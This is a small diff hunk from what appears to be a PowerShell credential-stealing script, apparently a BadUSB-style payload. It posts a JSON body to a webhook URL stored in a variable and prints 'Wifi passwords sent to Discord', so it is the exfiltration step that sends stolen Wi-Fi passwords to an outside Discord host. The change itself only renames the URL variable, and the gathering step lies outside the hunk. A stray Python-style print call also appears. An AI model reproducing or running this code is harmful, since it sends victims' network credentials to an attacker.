@@ -41,7 +41,9 @@ $jsonBody = @{
     
 } | ConvertTo-Json
 
-Invoke-RestMethod -Uri $dc -Method Post -Body $jsonBody -ContentType "application/json" 
+$hookurl = "$dc"
+
+Invoke-RestMethod -Uri $hookurl -Method Post -Body $jsonBody -ContentType "application/json" 
 
 print("Wifi passwords sent to Discord")
 
